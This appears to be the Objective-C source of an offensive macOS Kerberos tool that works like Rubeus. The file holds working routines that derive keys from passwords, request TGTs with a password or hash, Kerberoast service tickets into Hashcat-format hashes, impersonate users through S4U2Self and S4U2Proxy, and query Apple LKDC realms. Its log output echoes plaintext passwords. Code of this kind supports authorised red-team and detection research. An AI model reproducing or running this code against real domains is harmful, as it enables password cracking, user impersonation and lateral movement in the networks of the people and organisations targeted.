        ret = krb5_c_string_to_key(context, ENCTYPE_AES128_CTS_HMAC_SHA1_96, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
        final_key = [final_key stringByAppendingString:@"\nAES256: "];
        ret = krb5_c_string_to_key(context, ENCTYPE_AES256_CTS_HMAC_SHA1_96, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
        final_key = [final_key stringByAppendingString:@"\nRC4   : "];
        ret = krb5_c_string_to_key(context, ENCTYPE_ARCFOUR_HMAC, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
    }else{
        ret = krb5_c_string_to_key(context, enc_type, &data, &salt, &newKey);
        for(int i = 0; i < newKey.length; i++){
            final_key = [final_key stringByAppendingString:[NSString stringWithFormat:@"%02X", newKey.contents[i]]];
        }
    }
    return final_key;
}
//lots of base code pulled from https://github.com/viveksjain/heracles/blob/master/Heracles/HeraclesAppDelegate.m for the following
-(NSString*)getKerberosErrorMessage:(KLStatus)error {
    char *message;
    KLGetErrorString(error, &message);
    NSString *messageStr = [[NSString alloc] initWithUTF8String:message];
    KLDisposeString(message);
    if ([messageStr hasSuffix:@"\n"]) messageStr = [messageStr substringToIndex:([messageStr length] - 1)]; // Strip last newline
    return messageStr;
}
-(NSString*)checkAcquireTicketsError:(KLStatus)status {
    if (status == KRB5_KDC_UNREACH) {
        return @"[-] Unable to contact the Kerberos server.";
    } else if (status == KRB5KDC_ERR_PREAUTH_FAILED) return @"[-] Incorrect username or password.\n";
    
    NSString *errorMessage = [self getKerberosErrorMessage:status];
    //printf("[-] Error acquiring tickets: %d: %s", status, errorMessage.UTF8String);
    return [[NSString alloc] initWithFormat:@"[-] Error acquiring tickets: %@.\n", errorMessage];
}
-(NSString*)getTGTUsername:(NSString*)usernameToUse Password:(NSString*)passwordToUse Domain:(NSString*)domainToUse{
    KLPrincipal principal;
    NSString* fullPrincipal = usernameToUse;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    fullPrincipal = [fullPrincipal stringByAppendingString:@"@"];
    fullPrincipal = [fullPrincipal stringByAppendingString:domainToUse];
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting principal: %s\n", fullPrincipal.UTF8String]];
    //printf("[*] Requesting principal: %s\n", fullPrincipal.UTF8String);
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting password: %s\n", passwordToUse.UTF8String]];
    //printf("[*] Requesting password: %s\n", passwordToUse.UTF8String);
    KLStatus status = KLCreatePrincipalFromString([fullPrincipal UTF8String], kerberosVersion_V5, &principal);
    if (status != klNoErr) {
        KLDisposePrincipal(principal);
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String]];
        //printf("[-] Error creating principal: %d: %s", status, [self getKerberosErrorMessage:status].UTF8String);
        @throw output;
    }else{
        char* displayPrincipal;
        KLGetDisplayStringFromPrincipal(principal, kerberosVersion_V5, &displayPrincipal);
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating TGT Request for %s\n", displayPrincipal]];
        //printf("[*] Creating TGT Request for %s\n", displayPrincipal);
    }
    krb5_context context;
    krb5_init_context (&context);
    krb5_ccache newCcache;
    char* credCacheName;
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting TGT into temporary CCache\n"]];
    //printf("[*] Requesting TGT into temporary CCache\n");
    status = KLAcquireNewInitialTicketsWithPassword(principal, NULL, [passwordToUse UTF8String], &credCacheName);
    if (status == klNoErr) {
        NSMutableString* fullCredCacheName = [[NSMutableString alloc] initWithUTF8String:"API:"];
        [fullCredCacheName appendString:[[NSString alloc] initWithUTF8String:credCacheName]];
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String]];
        //printf("[+] Successfully got TGT into new CCache: %s\n", fullCredCacheName.UTF8String);
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Dumping ticket from new CCache and removing entry\n"]];
        //printf("[*] Dumping ticket from new CCache and removing entry\n");
        [self dumpCredentialsToKirbiCCache:fullCredCacheName.UTF8String Destroy:true];
        KLDisposePrincipal(principal);
    } else {
        KLDisposePrincipal(principal);
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [self checkAcquireTicketsError:status].UTF8String]];
        //printf("%s\n", [self checkAcquireTicketsError:status].UTF8String);
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.\n", usernameToUse]];
    return output;
}
-(NSString*)askTGTConnectDomain:(NSString*)connectDomain EncType:(int)enctype Hash:(NSString*)hash Username:(NSString*)username Domain:(NSString*)domain SupportAll:(bool)supportAll TgtEnctype:(int)tgtEnctype LKDCIP:(NSString*)lkdcip{
    //returns a base64 Kirbi version of the TGT
    kdc* kerbdc = [kdc alloc];
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    NSData* test = createASREQ(enctype, hash, username, domain, supportAll, tgtEnctype, [NSMutableArray arrayWithObjects: [NSNumber numberWithInt:2], [NSNumber numberWithInt:149], nil], NULL);
    int result;
    if(lkdcip != NULL){
        result = [kerbdc connectLKDCByIP:lkdcip.UTF8String];
    }else if(connectDomain != NULL){
        result = [kerbdc connectDomain:connectDomain.UTF8String];
    }else{
        result = [kerbdc connectDomain:domain.UTF8String];
    }
    if(result == -1){
        @throw @"[-] Failed to connect to the domain";
    }
    result = [kerbdc sendBytes:test];
    if(result == -1){
        @throw @"[-] Failed to send bytes";
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent ASREQ\n"]];
        //printf("[+] Successfully sent ASREQ\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received ASREP\n"]];
        //printf("[+] Successfully received ASREP\n");
    }
    NSData* asrep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length:holder.length];
    Krb5Ticket tgt;
    //printf("%s\n", [asrep base64EncodedStringWithOptions:0].UTF8String);
    if(lkdcip != NULL){
        tgt = parseLKDCASREP(asrep, hash, enctype);
    }else{
        tgt = parseASREP(asrep, hash, enctype);
    }
    if(tgt.app29 != NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
        //printf("[*] Describing ticket\n");
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(tgt).UTF8String]];
        //printf("%s\n", describeTicket(tgt).UTF8String);
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
        //printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(tgt);
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
        //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get TGT"]];
        @throw output;
    }
    return output;
}
-(NSString*)askTGSConnectDomain:(NSString*)connectDomainInput TGT:(NSString*)tgtKirbi Service:(NSString*)service ServiceDomain:(NSString*)serviceDomainInput Kerberoast:(bool)kerberoasting LKDCIP:(NSString*)LKDCIP{
    NSString* connectDomain = connectDomainInput;
    NSString* serviceDomain = serviceDomainInput;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    if(TGT.app29 == NULL){
        @throw @"[-] Failed to parse kirbi file\n";
    }
    if(connectDomain == NULL){
        connectDomain = TGT.app1.realm.KerbGenStringvalue;
    }
    if(serviceDomain == NULL){
        serviceDomain = TGT.app1.realm.KerbGenStringvalue;
        //printf("[*] Service domain: %s\n", serviceDomain.UTF8String);
    }
    kdc* kerbdc = [kdc alloc];
    int result;
    if(LKDCIP == NULL){
        result = [kerbdc connectDomain:connectDomain.UTF8String];
    }
    else{
        result = [kerbdc connectLKDCByIP:LKDCIP.UTF8String];
    }
    if(result == -1){
        @throw @"[-] Failed to connect to domain";
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String]];
    //printf("[*] Requesting service ticket to %s as %s\n", service.UTF8String, TGT.app29.cname.username.KerbGenStringvalue.UTF8String);
    NSData* tgsreq = createTGSREQ(TGT, service, kerberoasting, serviceDomain);
    //printf("%s\n", [tgsreq base64EncodedStringWithOptions:0].UTF8String);
    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent TGSREQ\n"]];
        //printf("[+] Successfully sent TGSREQ\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get bytes from KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received TGSREP\n"]];
        //printf("[+] Successfully received TGSREP\n");
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT, kerberoasting);
    if(sTicket.app29 != NULL){
        if( kerberoasting){
            //From Rubeus: string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
            NSString* octetvalues = sTicket.app1.encdata.getHexValue;
            [output appendString:[[NSString alloc] initWithFormat:@"[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String]];
            //printf("[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String);
        }
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
        //printf("[*] Describing ticket\n");
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
        //printf("%s\n", describeTicket(sTicket).UTF8String);
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
        //printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(sTicket);
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
        //printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        return output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket from response"]];
        @throw output;
    }
}
-(NSString*)s4uTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser SPN:(NSString*)spn{
    NSString* connectDomain = connectDomainInput;
    NSString* spnDomain;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    
    if( connectDomain == NULL ){
        connectDomain = TGT.app29.realm29.KerbGenStringvalue;
    }
    
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        @throw @"[-] Failed to connect to KDC";
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
    //printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
    NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
    if(sTicket.app29 != NULL){
        //we got a TGS back, now adjust it to be what we actually wanted
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
        NSData* kirbi = createKirbi(sTicket);
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Service Ticket"]];
        @throw output;
    }
    //now that we have a forwardable service ticket, do the S4U2Proxy process to get the next service ticket
    [kerbdc closeConnection];
    
    if( [spn containsString:@"@"] ){
        //spn is in the form service/host@domain, so we need to split that out
        NSArray* splitPieces = [spn componentsSeparatedByString:@"@"];
        spn = (NSString*)[splitPieces objectAtIndex:0];
        spnDomain = (NSString*)[splitPieces objectAtIndex:1];
    }else{
        spnDomain = sTicket.app29.realm29.KerbGenStringvalue;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Impersonating %s to service %s@%s via S4U2Proxy\n", sTicket.app29.cname.username.KerbGenStringvalue.UTF8String, spn.UTF8String, spnDomain.UTF8String]];
    NSData* S4U2ProxyReq = createS4U2ProxyReq(TGT, spn, spnDomain, [sTicket.app1 collapseToNSData]);
    result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
        @throw output;
    }
    result = [kerbdc sendBytes:S4U2ProxyReq];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
    }
    holder = [kerbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
    }
    Krb5Ticket s4uTicket = parseTGSREP(holder, TGT, false);
    if(s4uTicket.app29 != NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(s4uTicket).UTF8String]];
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
        NSData* kirbi = createKirbi(s4uTicket);
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
        @throw output;
    }
    return output;
}
-(NSString*)s4u2selfTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser{
    NSString* connectDomain = connectDomainInput;
    NSString* spnDomain;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    
    if( connectDomain == NULL ){
        connectDomain = TGT.app29.realm29.KerbGenStringvalue;
    }
    
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String]];
    NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request\n"]];
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to receive bytes from KDC"]];
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully received response\n"]];
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
    if(sTicket.app29 != NULL){
        //we got a TGS back, now adjust it to be what we actually wanted
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Describing ticket\n"]];
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", describeTicket(sTicket).UTF8String]];
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating Kirbi:\n"]];
        NSData* kirbi = createKirbi(sTicket);
        [kerbdc closeConnection];
        [output appendString:[[NSString alloc] initWithFormat:@"%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
        
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse service ticket from response"]];
        @throw output;
    }
    return output;
}
-(NSString*)askLKDCDomainByIP:(NSString*)IP{
    kdc* krbdc = [kdc alloc];
    int result = [krbdc connectLKDCByIP: IP.UTF8String];
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to connect to domain"]];
        @throw output;
    }
    // now to start the back-and-forth process with the LKDC at the end of the IP specified
    // Step 1: Application 10 AS-REQ with domain of WELLKNOWN:COM.APPLE.LKDC to get remote KDC Realm
    NSData* LKDC_Stage1_Req = LKDC_Stage1_GetRemoteRealm(@"");
    //printf("Stage 1 Req: %s\n", [LKDC_Stage1_Req base64EncodedStringWithOptions:0].UTF8String);
    result = [krbdc sendBytes:LKDC_Stage1_Req];
    if(result == -1){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to send bytes to KDC"]];
        @throw output;
    }
    else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully sent request for remote LKDC realm\n"]];
    }
    NSData* holder = [krbdc recvBytes];
    if(holder == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get response from remote LKDC\n"]];
        @throw output;
    }
    else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Received response from LKDC\n"]];
    }
    NSData* LKDC_Stage1_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
    //printf("Stage 1 Rep: %s\n", [LKDC_Stage1_Rep base64EncodedStringWithOptions:0].UTF8String);
    NSString* remoteRealm = LKDC_Stage1_ParseASREPForRemoteRealm(LKDC_Stage1_Rep);
    if(remoteRealm != NULL){
        //printf("[+] Remote realm is: %s\n", remoteRealm.UTF8String);
        return remoteRealm;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to get remote realm from KDC\n"]];
        @throw output;
    }
}
-(bool)createLKDCCACHECONFDataPrincipal:(NSString*)principalName TicketData:(NSString*)ticketData CCacheName:(NSString*)cacheName{
    krb5_ccache cache;
    krb5_context context;
    krb5_error_code ret;
    krb5_creds cred;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving ccache name %s\n", cacheName.UTF8String]];
    ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.addresses = NULL;
    cred.authdata = NULL;
    cred.is_skey = false;
    cred.ticket.data = ticketData.UTF8String;
    cred.ticket.length = ticketData.length;
    cred.ticket.magic = KV5M_TICKET;
    cred.ticket_flags = 0;
    cred.keyblock.magic = KV5M_KEYBLOCK;
    cred.keyblock.enctype = 0;
    cred.keyblock.length = 0;
    cred.keyblock.contents = NULL;
    krb5_principal sname;
    ret = krb5_build_principal(context, &sname, 2, "X-CACHECONF:", "krb5_ccache_conf_data", principalName.UTF8String, nil);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.server = sname;
    cred.magic = KV5M_CREDS;
    //convert generalizedTime formats back to integers
    NSDateFormatter *format = [[NSDateFormatter alloc] init];
    format.dateFormat = @"YYYYMMddHHmmssZ";
    format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    cred.times.starttime = [format dateFromString:@"19701231160000Z"].timeIntervalSince1970;
    cred.times.authtime = cred.times.starttime;
    cred.times.endtime = [NSDate date].timeIntervalSince1970;
    //convert cname
    krb5_principal cname;
    ret = krb5_cc_get_principal (context, cache, &cname);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.client = cname;

    //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Saving credential for %s\n", principalName.UTF8String]];
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to store cred, trying to initialize first\n"]];
        //can't store cred to a new store without initializing it, so make sure to do that if storing fails
        ret = krb5_cc_initialize(context, cache, cred.client);
        if(ret){
            @throw output;
        }
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully initialized cache\n"]];
    }
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully imported credential\n"]];
    return true;
}
-(bool)storeLKDCConfDataFriendlyName:(NSString*)friendlyName Hostname:(NSString*)hostname Password:(NSString*)password CCacheName:(NSString*)cacheName{
    bool ret;
    //FriendlyName is the username
    ret = [self createLKDCCACHECONFDataPrincipal:@"FriendlyName" TicketData:friendlyName CCacheName:cacheName];
    if(!ret){
        return false;
    }
    //lkdc-hostname is the remote hostname or IP
    ret = [self createLKDCCACHECONFDataPrincipal:@"lkdc-hostname" TicketData:hostname CCacheName:cacheName];
    if(!ret){
        return false;
    }
    ret = [self createLKDCCACHECONFDataPrincipal:@"nah-created" TicketData:@"1" CCacheName:cacheName];
    if(!ret){
        return false;
    }
    ret = [self createLKDCCACHECONFDataPrincipal:@"iakerb" TicketData:@"1" CCacheName:cacheName];
    if(!ret){
        return false;
    }
    ret = [self createLKDCCACHECONFDataPrincipal:@"password" TicketData:password CCacheName:cacheName];
    if(!ret){
        return false;
    }
    return true;
}
@end
